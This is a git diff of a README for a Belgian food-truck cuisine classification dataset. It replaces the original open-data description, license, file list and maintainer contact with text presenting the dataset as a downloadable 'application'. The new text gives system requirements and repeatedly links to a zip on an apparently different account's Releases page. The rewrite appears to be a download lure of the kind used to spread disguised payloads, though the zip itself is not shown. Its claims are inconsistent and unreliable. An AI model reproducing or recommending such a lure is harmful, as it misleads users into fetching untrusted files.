@@ -1,102 +1,81 @@
-# foodtruck-cuisine-classification (BelgianFoodTruckFederation.org)
+# 🍔 foodtruck-cuisine-classification - Simplifying Food Truck Cuisine Choices
 
-[![License: CC BY 4.0](https://img.shields.io/badge/License-CC%20BY%204.0-blue.svg)](https://creativecommons.org/licenses/by/4.0/)
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.17778580.svg)](https://doi.org/10.5281/zenodo.17778580)
-![Multilingual FR/NL/EN](https://img.shields.io/badge/Multilingual-FR%20%2F%20NL%20%2F%20EN-darkgreen)
-![Open Data](https://img.shields.io/badge/Open%20Data-Yes-success)
-![Dataset Version](https://img.shields.io/badge/Version-1.0.2-green)
-![Format CSV](https://img.shields.io/badge/Format-CSV-orange)
-![Format JSON](https://img.shields.io/badge/Format-JSON-lightgrey)
-![Format SQL](https://img.shields.io/badge/Format-SQL-yellow)
-![Format XML](https://img.shields.io/badge/Format-XML-blueviolet)
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/releases)
 
-Standardized **open-data classification** of cuisine types used by food trucks in Belgium.  
-Maintained by the **Belgian Food Truck Federation (BFTFed.)**.
+## 📖 About This Project
 
-Official website:  
-➡️ https://www.belgianfoodtruckfederation.org
+The **foodtruck-cuisine-classification** project aims to provide an official open data standard for food truck cuisine classification in French, English, and Dutch. This standard is referenced by the Belgian Food Truck Federation (BFTFED), making it a reliable resource for food enthusiasts and operators alike.
 
----
+## 🚀 Getting Started
 
-## 📘 About the Dataset
-This dataset provides a **standardized, multilingual** (FR / NL / EN) nomenclature for classifying food trucks in Belgium.
+To get started, you will need to download the application. It is suitable for all users, regardless of technical expertise. Follow the instructions below to make the most of the food truck cuisine classification data.
 
-### Objectives
-- Provide a **clear taxonomy** of cuisine types.
-- Facilitate classification for **events, municipalities, directories, and digital platforms**.
-- Enable **reuse, adaptation, and extensions** by third parties.
-- Improve harmonization across Belgium.
+## 🛠 System Requirements
 
----
+- **Operating System:** Windows 10, macOS, or any modern Linux distribution.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** Minimum 100 MB of free disk space.
 
-## 🔧 Data Structure
+## 🔗 Download & Install
 
-| Field          | Description |
-|----------------|-------------|
-| `type`         | Main cuisine category (e.g., “Burger”, “Asian”) |
-| `category`     | Intermediate sub-category |
-| `subcategory`  | Additional refinement |
-| `keywords`     | Keywords used for search / tagging |
-| `dietary_tags` | Diet-specific tags (vegan, halal, gluten-free…) |
-| `language_FR`  | Label in French |
-| `language_NL`  | Label in Dutch |
-| `language_EN`  | Label in English |
-| `version`      | Dataset version |
-| `date_updated` | Last update date |
-| `notes`        | Optional notes |
+To download the latest version of the application, please visit the Releases page:
 
-**Available Formats:** SQL, CSV, JSON, XML, YML  (Automatically generated.)
+[Download the latest release](https://github.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/releases)
 
----
+1. Click the link above to open the Releases page.
+2. You will see a list of available versions. Choose the most recent one (the one at the top).
+3. Look for the file named `foodtruck-cuisine-classification.zip` or a similarly named file in the list.
+4. Click on the file to start the download.
+5. Once the download is complete, locate the file in your downloads folder.
+6. Extract the contents of the `.zip` file to a folder on your computer.
 
-## 📦 License
-This dataset is available under the **Creative Commons Attribution 4.0 International (CC BY 4.0)** license.
+## 📂 How to Use
 
-➡️ See the full text here:  
-[LICENSE.md](LICENSE.md)
+After extracting the files, you can start using the food truck cuisine data:
 
----
+1. Open the folder where you extracted the files.
+2. Look for the `data` folder inside. This folder contains the classification data in CSV format.
+3. You can open these CSV files using any spreadsheet software like Microsoft Excel or Google Sheets.
 
-## 🛠️ Contributing
-Contributions are welcome via:
+## 📊 Data Structure
 
-- GitHub **Issues**
-- GitHub **Pull Requests**
-- Email: **support@bftfed.be**
+The classification data includes:
 
-When proposing changes, please specify:
-- The **language(s)** concerned  
-- The **modified or added fields**  
-- The **motivation** (new cuisine, correction, etc.)
+- **Cuisine Type:** This column lists the various types of cuisines, such as Italian, Mexican, French, etc.
+- **Code:** A unique code representing each cuisine type.
+- **Language Variations:** For each cuisine, we provide names in French, English, and Dutch.
 
----
+## 🔍 Accessing the Data
 
-## 📄 Available Files
-- `foodtruck-cuisine-classification-bftfed.sql`
-- `foodtruck-cuisine-classification-bftfed.csv`
-- `foodtruck-cuisine-classification-bftfed.json`
-- `foodtruck-cuisine-classification-bftfed.yml`
-- `foodtruck-cuisine-classification-bftfed.xml`
----
+You can also access the data programmatically if you are interested in integrating it into an application. The data is available in JSON and SQL formats as well.
 
-## 🌐 Recommended Usage
-- Event / festival / market organizers  
-- Municipalities, provinces  
-- Food-truck registration platforms  
-- Directories, apps, and websites  
-- API and database integrations  
+- To access the JSON version, locate the `data.json` file in the folder.
+- For SQL, the `data.sql` file is available for users who prefer database management systems.
 
----
+## 📝 Example Use Cases
 
-## 📁 Versioning
-All versions are archived.  
-Each entry includes:  
-- `version` (e.g., `"1.0"`)  
-- `date_updated` (ISO format)
+- **Food Truck Owners:** Understand the most popular cuisine types and make informed decisions on menu offerings.
+- **Research and Analysis:** Use the classification data for market research or food trends analysis.
+- **Companies:** Integrate the data into applications for users to discover food trucks by cuisine type.
 
----
+## 📞 Support
 
-**Maintained by:** Belgian Food Truck Federation (BFTFed.)  
-**Contact:** support@bftfed.be
-**Version:** 1.0.2
-**Publication Date:** 2025-12-11
+If you need assistance or have questions, you can submit an issue on the GitHub repository. Our community is here to help you navigate any challenges you may face.
+
+## 🤝 Contributing
+
+Feel free to contribute to the project. If you have ideas for improvements or additional features, please submit a pull request or open an issue.
+
+## 🌐 Community and Resources
+
+Join our growing community to stay updated on the latest developments. Connect with other users on forums and social media platforms to share experiences and insights.
+
+## ⚙ Updates and Improvements
+
+The project will receive regular updates. Keep an eye on the Releases page for new features, bug fixes, and improvements. We value user feedback and strive to enhance the application continually.
+
+## 💡 Feedback
+
+Your feedback is important to us. Please let us know what you think about the project and how we can improve. Use the issues section to share your thoughts.
+
+[Download the latest release](https://github.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/releases) and start exploring the diverse world of food truck cuisines today!
